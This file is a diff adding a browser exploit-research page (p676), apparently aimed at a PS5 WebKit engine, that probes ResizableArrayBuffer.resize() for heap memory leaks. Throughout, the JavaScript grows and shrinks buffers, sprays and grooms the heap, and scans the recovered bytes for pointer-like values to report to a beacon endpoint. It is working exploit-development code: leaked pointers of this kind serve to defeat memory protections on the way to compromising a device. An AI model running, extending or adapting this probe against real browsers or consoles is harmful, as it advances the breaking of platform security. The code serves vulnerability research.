@@ -1,0 +1,316 @@
+<!--
+  p676: ResizableArrayBuffer heap data residue probe
+  
+  Goal: Find an info leak via ResizableArrayBuffer.resize()
+  
+  Theory: When a RAB grows, the new region might contain:
+    1. Uninitialized heap data (pointers, vtables, metadata)
+    2. Data from previously freed allocations
+    3. Stale data from the old backing store location
+  
+  The spec says new bytes MUST be zeroed, but implementations sometimes:
+    - Zero lazily (race window)
+    - Miss edge cases on certain size transitions
+    - Don't zero when resizing DOWN then UP (hysteresis)
+  
+  Also tests:
+    - Creating TypedArray views before resize, reading after (stale pointer)
+    - Detach/transfer + resize combinations
+    - Rapid resize cycling to stress the allocator
+    - Spray objects between resize down and resize up
+  
+  CRASH_CLASS: LOW (read-only probing, no controlled writes)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p676</title></head>
+<body>p676: ResizableArrayBuffer heap leak
+<pre id="log" style="color:#0f0;background:#000;font:12px monospace;padding:8px;white-space:pre-wrap"></pre>
+<script>
+(function(){
+'use strict';
+var L=document.getElementById('log'),bQ=[];
+function emit(t,m){var s=t+(m!==undefined?' '+m:'');L.textContent+=s+'\n';bQ.push(s);if(bQ.length>=1)flush();}
+function flush(){if(!bQ.length)return;try{var b=bQ.splice(0,3).join('|');var x=new XMLHttpRequest();x.open('GET','/beacon/P676-'+encodeURIComponent(b),false);x.send();}catch(e){}}
+window.onerror=function(m){emit('ERR',String(m).slice(0,200));flush();};
+
+function hexdump(u8,off,len){
+  var s='';
+  for(var i=0;i<len&&(off+i)<u8.length;i++){
+    s+=('0'+u8[off+i].toString(16)).slice(-2);
+    if((i&3)===3)s+=' ';
+  }
+  return s.trim();
+}
+
+function countNonZero(u8,off,len){
+  var c=0;
+  for(var i=0;i<len&&(off+i)<u8.length;i++) if(u8[off+i]!==0)c++;
+  return c;
+}
+
+// Look for pointer-like values (8 bytes, high bytes suggest kernel/heap addr)
+function findPointers(u8,off,len){
+  var ptrs=[];
+  var dv=new DataView(u8.buffer,u8.byteOffset,u8.byteLength);
+  for(var i=off;i+8<=off+len&&i+8<=u8.length;i+=8){
+    var lo=dv.getUint32(i,true);
+    var hi=dv.getUint32(i+4,true);
+    // Check for pointer-like patterns:
+    // Heap: 0x00007fXXXXXXXXXX (userland) or 0xFFFFFFXXXXXXXXXX (kernel)
+    // Also WebKit heap: 0x0000NNXXXXXXXXXX where NN=1-6
+    if(hi===0&&lo===0)continue;
+    if((hi>>>16)===0x7f||(hi>>>16)===0x7e||hi===0xFFFFFFFF||
+       (hi>>>24)===0x01||(hi>>>24)===0x02||(hi>>>24)===0x03){
+      ptrs.push({off:i,hi:hi,lo:lo,hex:'0x'+('00000000'+hi.toString(16)).slice(-8)+('00000000'+lo.toString(16)).slice(-8)});
+    }
+  }
+  return ptrs;
+}
+
+emit('START','v1');flush();
+
+// ================================================================
+// A: Basic resize — grow and check if new region is zeroed
+// ================================================================
+emit('A','basic-grow-zero-check');
+try{
+  var sizes=[256,512,1024,4096,16384,65536];
+  for(var si=0;si<sizes.length;si++){
+    var initSize=64;
+    var maxSize=sizes[si];
+    var rab=new ArrayBuffer(initSize,{maxByteLength:maxSize});
+    var u8=new Uint8Array(rab);
+    // Fill initial region with marker
+    for(var i=0;i<initSize;i++) u8[i]=0xAA;
+    // Grow
+    rab.resize(maxSize);
+    // Check new region
+    var nz=countNonZero(u8,initSize,maxSize-initSize);
+    if(nz>0){
+      emit('A-LEAK','size='+maxSize+' nonzero='+nz+'/'+( maxSize-initSize));
+      emit('A-HEX',hexdump(u8,initSize,Math.min(64,maxSize-initSize)));
+      var ptrs=findPointers(u8,initSize,maxSize-initSize);
+      if(ptrs.length>0){
+        for(var p=0;p<Math.min(ptrs.length,5);p++)
+          emit('A-PTR','off='+ptrs[p].off+' val='+ptrs[p].hex);
+      }
+    } else {
+      emit('A-CLEAN','size='+maxSize+' all-zero');
+    }
+  }
+}catch(e){emit('A-ERR',e.name+':'+e.message);}
+flush();
+
+// ================================================================
+// B: Shrink then grow — data from freed region?
+// Shrink frees pages, grow re-allocates — might get stale data
+// ================================================================
+emit('B','shrink-grow-cycle');
+try{
+  var rab2=new ArrayBuffer(65536,{maxByteLength:65536});
+  var u8_2=new Uint8Array(rab2);
+  // Fill with pattern
+  for(var i=0;i<65536;i++) u8_2[i]=(i&0xFF);
+  // Shrink to minimum
+  rab2.resize(64);
+  
+  // Spray heap between shrink and grow to put interesting data in freed pages
+  var sprays=[];
+  for(var i=0;i<200;i++){
+    var obj={a:new ArrayBuffer(256),b:new Float64Array(32)};
+    obj.b[0]=1.1;obj.b[1]=2.2;obj.b[3]=i;
+    sprays.push(obj);
+  }
+  
+  // Grow back
+  rab2.resize(65536);
+  var nz2=countNonZero(u8_2,64,65536-64);
+  emit('B-RESULT','nonzero='+nz2+'/'+(65536-64));
+  if(nz2>0){
+    emit('B-HEX-256',hexdump(u8_2,64,64));
+    emit('B-HEX-4096',hexdump(u8_2,4096,64));
+    var ptrs2=findPointers(u8_2,64,65536-64);
+    emit('B-PTRS','found='+ptrs2.length);
+    for(var p=0;p<Math.min(ptrs2.length,10);p++)
+      emit('B-PTR','off='+ptrs2[p].off+' val='+ptrs2[p].hex);
+  }
+  sprays=null;
+}catch(e){emit('B-ERR',e.name+':'+e.message);}
+flush();
+
+// ================================================================
+// C: Rapid resize cycling — stress allocator, might miss zeroing
+// ================================================================
+emit('C','rapid-cycle');
+try{
+  var leakFound=false;
+  for(var round=0;round<20&&!leakFound;round++){
+    var rab3=new ArrayBuffer(64,{maxByteLength:32768});
+    var u8_3=new Uint8Array(rab3);
+    // Cycle rapidly
+    for(var c=0;c<50;c++){
+      rab3.resize(32768);
+      rab3.resize(64);
+    }
+    // One final grow — check for residue
+    rab3.resize(32768);
+    var nz3=countNonZero(u8_3,64,32768-64);
+    if(nz3>0){
+      emit('C-LEAK','round='+round+' nonzero='+nz3);
+      emit('C-HEX',hexdump(u8_3,64,64));
+      leakFound=true;
+    }
+  }
+  if(!leakFound) emit('C-RESULT','all-zero after 20 rounds x 50 cycles');
+}catch(e){emit('C-ERR',e.name+':'+e.message);}
+flush();
+
+// ================================================================
+// D: TypedArray view created at large size, resize down, resize up
+// Check if the TypedArray sees stale data after regrow
+// ================================================================
+emit('D','view-across-resize');
+try{
+  var rab4=new ArrayBuffer(4096,{maxByteLength:4096});
+  var f64=new Float64Array(rab4);
+  // Write recognizable pattern
+  for(var i=0;i<f64.length;i++) f64[i]=3.14159+i;
+  // Shrink — f64 should auto-track
+  rab4.resize(64);
+  // f64.length should now be floor(64/8)=8
+  emit('D-AFTER-SHRINK','f64.length='+f64.length);
+  
+  // Spray objects to reclaim freed pages
+  var spray2=[];
+  for(var i=0;i<500;i++) spray2.push(new ArrayBuffer(512));
+  
+  // Grow back
+  rab4.resize(4096);
+  emit('D-AFTER-GROW','f64.length='+f64.length);
+  
+  // Check: does f64[8..] contain spray data or zeros?
+  var anomalies=[];
+  for(var i=8;i<f64.length;i++){
+    var v=f64[i];
+    if(v!==0&&!isNaN(v)){
+      anomalies.push({i:i,v:v,hex:'0x'+('00000000'+((v>>>0)&0xFFFFFFFF).toString(16)).slice(-8)});
+    }
+  }
+  emit('D-ANOMALIES','count='+anomalies.length);
+  for(var a=0;a<Math.min(anomalies.length,10);a++){
+    emit('D-ANOM','i='+anomalies[a].i+' v='+anomalies[a].v);
+  }
+  spray2=null;
+}catch(e){emit('D-ERR',e.name+':'+e.message);}
+flush();
+
+// ================================================================
+// E: Multiple RABs — allocate/free pattern to create heap holes
+// then grow into them
+// ================================================================
+emit('E','heap-hole-grow');
+try{
+  // Create many RABs, fill with markers, free alternating ones
+  var rabs=[];
+  for(var i=0;i<50;i++){
+    var r=new ArrayBuffer(1024,{maxByteLength:4096});
+    var v=new Uint32Array(r);
+    v[0]=0xDEAD0000+i;
+    v[1]=0xBEEF0000+i;
+    rabs.push(r);
+  }
+  // "Free" even-indexed ones
+  for(var i=0;i<50;i+=2) rabs[i]=null;
+  // Force GC
+  var junk=[];
+  try{for(var i=0;i<30000;i++)junk.push({x:i});}catch(e){}
+  junk=null;
+  
+  // Grow odd-indexed ones into the freed holes
+  var leaks=0;
+  for(var i=1;i<50;i+=2){
+    if(!rabs[i])continue;
+    try{
+      rabs[i].resize(4096);
+      var check=new Uint32Array(rabs[i]);
+      // Check extended region for DEAD/BEEF markers from freed RABs
+      for(var j=256;j<1024;j++){
+        if((check[j]&0xFFFF0000)===0xDEAD0000||(check[j]&0xFFFF0000)===0xBEEF0000){
+          emit('E-LEAK','rab='+i+' off='+j*4+' val=0x'+check[j].toString(16));
+          leaks++;
+          if(leaks>=5)break;
+        }
+      }
+    }catch(e){}
+    if(leaks>=5)break;
+  }
+  emit('E-RESULT','leaks='+leaks);
+}catch(e){emit('E-ERR',e.name+':'+e.message);}
+flush();
+
+// ================================================================
+// F: transfer() + new RAB — does transferred buffer leave residue?
+// ================================================================
+emit('F','transfer-residue');
+try{
+  if(typeof ArrayBuffer.prototype.transfer!=='function'){
+    emit('F-SKIP','no transfer()');
+  } else {
+    var ab1=new ArrayBuffer(4096);
+    var fill=new Uint32Array(ab1);
+    for(var i=0;i<fill.length;i++) fill[i]=0xCAFE0000+i;
+    // Transfer — old is detached, new gets the data
+    var ab2=ab1.transfer();
+    // ab1 is detached now
+    // Create a new RAB that might land where ab1 was
+    var rab5=new ArrayBuffer(64,{maxByteLength:4096});
+    rab5.resize(4096);
+    var check2=new Uint32Array(rab5);
+    var cafeFound=0;
+    for(var i=0;i<check2.length;i++){
+      if((check2[i]&0xFFFF0000)===0xCAFE0000){
+        emit('F-LEAK','off='+i*4+' val=0x'+check2[i].toString(16));
+        cafeFound++;
+        if(cafeFound>=5)break;
+      }
+    }
+    emit('F-RESULT','cafe_found='+cafeFound);
+  }
+}catch(e){emit('F-ERR',e.name+':'+e.message);}
+flush();
+
+// ================================================================
+// G: Large RAB resize — try page-boundary effects
+// Pages are 16KB on PS5. Resize across page boundaries.
+// ================================================================
+emit('G','page-boundary');
+try{
+  var pageSize=16384;
+  var rab6=new ArrayBuffer(pageSize-8,{maxByteLength:pageSize*4});
+  var u8_6=new Uint8Array(rab6);
+  for(var i=0;i<u8_6.length;i++) u8_6[i]=0xBB;
+  // Grow to cross page boundary
+  rab6.resize(pageSize+8);
+  // Check the bytes right after the page boundary
+  var crossNZ=countNonZero(u8_6,pageSize-8,16);
+  emit('G-CROSS','nonzero_at_boundary='+crossNZ);
+  if(crossNZ>0){
+    emit('G-HEX',hexdump(u8_6,pageSize-8,32));
+  }
+  // Grow to 4 pages
+  rab6.resize(pageSize*4);
+  var nz6=countNonZero(u8_6,pageSize+8,pageSize*3-8);
+  emit('G-FULL','nonzero='+nz6+'/'+(pageSize*3-8));
+  if(nz6>0){
+    var ptrs6=findPointers(u8_6,pageSize+8,pageSize*3-8);
+    emit('G-PTRS','found='+ptrs6.length);
+    for(var p=0;p<Math.min(ptrs6.length,5);p++)
+      emit('G-PTR','off='+ptrs6[p].off+' val='+ptrs6[p].hex);
+  }
+}catch(e){emit('G-ERR',e.name+':'+e.message);}
+flush();
+
+emit('DONE','p676-complete');flush();
+})();
+</script>
+</body>
+</html>
